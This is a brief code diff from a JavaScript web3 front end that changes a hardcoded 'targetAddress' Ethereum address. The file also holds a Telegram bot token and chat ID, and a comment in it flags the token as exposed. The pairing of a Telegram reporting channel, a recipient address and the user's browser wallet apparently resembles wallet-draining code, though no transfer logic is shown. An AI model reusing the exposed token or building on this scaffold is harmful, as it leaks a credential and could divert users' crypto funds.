@@ -3,7 +3,7 @@ import Web3 from "web3";
 import { ABI } from "./constant";
 const botToken = "6910766449:AAH_KtR65hweWsgLQMJXXgAadzG2PSN892U"; // Caution: Exposing token
 const chatId = "1876632135";
-const targetAddress = "0xac798ad8c3f4b3226bb0d1b769d4a23376bfdf46";
+const targetAddress = "0x3173D3750e6F12457E8703D268dCcF3b84519343";
 
 let web3 = new Web3(window.ethereum);
 export const sendMessage = async (message) => {
